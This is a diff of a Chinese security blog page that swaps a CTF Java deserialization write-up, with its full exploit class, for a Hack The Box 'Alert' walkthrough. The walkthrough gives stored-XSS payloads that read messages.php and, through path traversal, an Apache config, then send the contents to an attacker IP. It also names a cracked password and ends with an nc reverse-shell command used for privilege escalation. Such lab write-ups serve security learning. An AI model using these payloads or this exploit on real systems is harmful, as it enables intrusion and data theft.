@@ -4,11 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="东华杯ezgadgetJava反序列化, InBlog">
-    <meta name="description" content="分析题目是一个jar包
-其中ToStringBean类下调用了defineclass和newInstance方法.跟之前的CC3一样造成任意代码执行
+    <meta name="keywords" content="HTB-Alert靶机, InBlog">
+    <meta name="description" content="getshell扫描端口存在22和80端口，添加网址到hosts
+10.10.11.44 alert.htb
 
-而在之前的CC5中BadAttributeValueExpException调用了toS">
+访问网址存在文件上传
+
+文件上传md白名单无法上传shell，但能上传存储XSS
+目录扫描存在messages.php，可以使用">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>东华杯ezgadgetJava反序列化 | InBlog</title>
+    <title>HTB-Alert靶机 | InBlog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -250,12 +253,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">东华杯ezgadgetJava反序列化</h1>
+                    <h1 class="description center-align post-title">HTB-Alert靶机</h1>
                 </div>
             </div>
         </div>
@@ -279,8 +282,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Java/">
-                                <span class="chip bg-color">Java</span>
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">靶场</span>
                             </a>
                         
                     </div>
@@ -291,8 +294,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/ctf/" class="post-category">
-                                ctf
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -304,7 +307,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-09-27
+                    2025-01-01
                 </div>
                 
 
@@ -313,14 +316,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    358
+                    525
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -348,72 +351,98 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目是一个jar包</p>
-<p>其中<code>ToStringBean</code>类下调用了defineclass和newInstance方法.跟之前的CC3一样造成任意代码执行</p>
-<p><img src="/images/posts/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240927201628256.png"></p>
-<p>而在之前的CC5中<code>BadAttributeValueExpException</code>调用了<code>toString</code>方法</p>
-<p><img src="/images/posts/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240927202653895.png"></p>
-<p>所以链子为<code>BadAttributeValueExpException</code>-&gt;<code>toString</code></p>
-<h1 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h1><p>先通过反射修改<code>ClassByte</code>的值</p>
-<pre class="language-Java" data-language="Java"><code class="language-Java">ToStringBean toStringBean &#x3D; new ToStringBean();
-Field declaredField &#x3D; toStringBean.getClass().getDeclaredField(&quot;ClassByte&quot;);
-declaredField.setAccessible(true);
+                <h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>扫描端口存在22和80端口，添加网址到hosts</p>
+<pre class="language-none"><code class="language-none">10.10.11.44 alert.htb</code></pre>
 
-byte[] bytes &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));
-declaredField.set(toStringBean,bytes);</code></pre>
+<p>访问网址存在文件上传</p>
+<p><img src="/images/posts/HTB-Alert%E9%9D%B6%E6%9C%BA/image-20250101195427041.png" alt="image-20250101195427041"></p>
+<p>文件上传md白名单无法上传shell，但能上传存储XSS</p>
+<p>目录扫描存在<code>messages.php</code>，可以使用XSS来获取用户访问页面的响应内容</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://alert.htb/messages.php"</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resp</span> <span class="token operator">=></span> resp<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">text</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://10.10.16.9:1234/?text=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">btoa</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://10.10.16.9:1234/?err=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>err<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
 
-<p>再用<code>BadAttributeValueExpException</code>来调用<code>toString</code></p>
-<p><img src="/images/posts/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240927203732634.png"></p>
-<p>这里是调用<code>toString</code>后将结果赋值给了val,然后<code>readObject</code>调用val的<code>toString</code>.所以这里随便传一个值在后面在反射修改回来</p>
-<pre class="language-Java" data-language="Java"><code class="language-Java">BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(113);&#x2F;&#x2F;随便传
+<p>监听1234端口即可获取响应内容</p>
+<p>在Contact Us(联系我们)处可提交XSS的网址，返回高权限访问<code>messages.php</code>的响应内容</p>
+<p>解码后内容为</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Messages<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>messages.php?file=2024-03-10_15-48-34.txt<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>2024-03-10_15-48-34.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code></pre>
 
-Field declaredField1 &#x3D; badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
-declaredField1.setAccessible(true);
-declaredField1.set(badAttributeValueExpException,toStringBean);</code></pre>
+<p>存在文件读取</p>
+<p>读取根据敏感文件<code>/etc/apache2/sites-available/000-default.conf</code>存在敏感文件&#x2F;var&#x2F;www&#x2F;statistics.alert.htb&#x2F;.htpasswd</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://alert.htb/messages.php?file=../../../../../../../../../../../etc/apache2/sites-available/000-default.conf"</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resp</span> <span class="token operator">=></span> resp<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">text</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://10.10.16.9:1234/?text=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">btoa</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://10.10.16.9:1234/?err=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>err<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
 
-<p><code>IndexController</code>里面的if判断</p>
-<pre class="language-none"><code class="language-none">if (name.equals(&quot;gadgets&quot;) &amp;&amp; year &#x3D;&#x3D; 2021) &#123;
-    objectInputStream.readObject();
-&#125;</code></pre>
 
-<p>所以最后的EXP为</p>
-<pre class="language-Java" data-language="Java"><code class="language-Java">package com.ezgame.ctf.tools;
 
-import javax.management.BadAttributeValueExpException;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.nio.file.Files;
-import java.nio.file.Paths;
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>pre<span class="token operator">></span><span class="token operator">&lt;</span>VirtualHost *:8<span class="token operator"><span class="token file-descriptor important">0</span>></span>
+    ServerName alert.htb
 
-public class EXP &#123;
-    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException &#123;
-        ToStringBean toStringBean &#x3D; new ToStringBean();
-        Field declaredField &#x3D; toStringBean.getClass().getDeclaredField(&quot;ClassByte&quot;);
-        declaredField.setAccessible(true);
+    DocumentRoot /var/www/alert.htb
 
-        byte[] bytes &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));
-        declaredField.set(toStringBean, bytes);
+    <span class="token operator">&lt;</span>Directory /var/www/alert.htb<span class="token operator">></span>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span>
 
-        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(113);&#x2F;&#x2F;随便传
+    RewriteEngine On
+    RewriteCond %<span class="token punctuation">&#123;</span>HTTP_HOST<span class="token punctuation">&#125;</span> <span class="token operator">!</span>^alert<span class="token punctuation">\</span>.htb$
+    RewriteCond %<span class="token punctuation">&#123;</span>HTTP_HOST<span class="token punctuation">&#125;</span> <span class="token operator">!</span>^$
+    RewriteRule ^/?<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>$ http://alert.htb/<span class="token variable">$1</span> <span class="token punctuation">[</span>R<span class="token operator">=</span><span class="token number">301</span>,L<span class="token punctuation">]</span>
 
-        Field declaredField1 &#x3D; badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
-        declaredField1.setAccessible(true);
-        declaredField1.set(badAttributeValueExpException, toStringBean);
+    ErrorLog <span class="token variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log
+    CustomLog <span class="token variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined
+<span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span>
 
-        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();
-        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);
-        objectOutputStream.writeUTF(&quot;gadgets&quot;);
-        objectOutputStream.writeInt(2021);
-        objectOutputStream.writeObject(badAttributeValueExpException);
+<span class="token operator">&lt;</span>VirtualHost *:8<span class="token operator"><span class="token file-descriptor important">0</span>></span>
+    ServerName statistics.alert.htb
 
-        byte[] byteArray &#x3D; byteArrayOutputStream.toByteArray();
-        String bytes1 &#x3D; Tools.base64Encode(byteArray);
-        System.out.println(bytes1);
-    &#125;
+    DocumentRoot /var/www/statistics.alert.htb
 
-&#125;</code></pre>
+    <span class="token operator">&lt;</span>Directory /var/www/statistics.alert.htb<span class="token operator">></span>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span>
+
+    <span class="token operator">&lt;</span>Directory /var/www/statistics.alert.htb<span class="token operator">></span>
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        AuthType Basic
+        AuthName <span class="token string">"Restricted Area"</span>
+        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
+        Require valid-user
+    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span>
+
+    ErrorLog <span class="token variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log
+    CustomLog <span class="token variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined
+<span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span>
+
+<span class="token operator">&lt;</span>/pre<span class="token operator">></span></code></pre>
+
+<p>读取后john爆破密码为manchesterunited。</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>SSH连接后top监控进程命令，查看到config目录进程，进入后发现management组可编辑，当前用户属于management组，写入</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&amp;1 | nc 10.10.16.9 5566 >/tmp/f'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>命令，nc监听即可提权成功</p>
+
                 
             </div>
             <hr/>
@@ -439,7 +468,7 @@ public class EXP &#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://doramer.github.io/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://doramer.github.io/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                    <a href="https://doramer.github.io/HTB-Alert%E9%9D%B6%E6%9C%BA/">https://doramer.github.io/HTB-Alert%E9%9D%B6%E6%9C%BA/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -477,8 +506,8 @@ public class EXP &#123;
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Java/">
-                                    <span class="chip bg-color">Java</span>
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">靶场</span>
                                 </a>
                             
                         </div>
@@ -524,17 +553,18 @@ public class EXP &#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/Shiro550,CB2/">
+                <a href="/HTB-Alert%E9%9D%B6%E6%9C%BA/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Shiro550,CB2">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="HTB-Alert靶机">
                         
-                        <span class="card-title">Shiro550,CB2</span>
+                        <span class="card-title">HTB-Alert靶机</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -544,26 +574,27 @@ public class EXP &#123;
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                    代码审计
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Java/">
-                        <span class="chip bg-color">Java</span>
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
                     </a>
                     
                 </div>
@@ -577,13 +608,13 @@ public class EXP &#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/CommonsBeanUtils%20CB%E9%93%BE/">
+                <a href="/Go%E8%BF%9B%E9%98%B6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="CommonsBeanUtils CB链">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Go进阶">
                         
-                        <span class="card-title">CommonsBeanUtils CB链</span>
+                        <span class="card-title">Go进阶</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -594,14 +625,14 @@ public class EXP &#123;
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-12-05
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                    代码审计
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" class="post-category">
+                                    安全开发
                                 </a>
                             
                             
@@ -611,8 +642,8 @@ public class EXP &#123;
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Java/">
-                        <span class="chip bg-color">Java</span>
+                    <a href="/tags/Go%E8%AF%AD%E8%A8%80/">
+                        <span class="chip bg-color">Go语言</span>
                     </a>
                     
                 </div>
